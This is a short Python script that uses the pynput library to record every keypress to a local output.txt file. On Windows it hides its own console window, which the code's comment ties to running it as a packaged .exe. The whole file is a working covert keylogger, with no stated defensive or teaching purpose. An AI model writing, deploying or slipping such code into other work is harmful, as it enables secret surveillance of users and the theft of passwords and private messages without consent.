import os
import sys
from pynput import keyboard

if __name__ == "__main__":
    # Hide console window if running as .exe
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def write_to_file(text):
        file_path = os.path.join(os.path.dirname(__file__), "output.txt")
        with open(file_path, "a") as f:
            f.write(text + "\n")

    write_to_file('program running')

    def on_press(key):
        write_to_file(f'key {key} pressed')

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()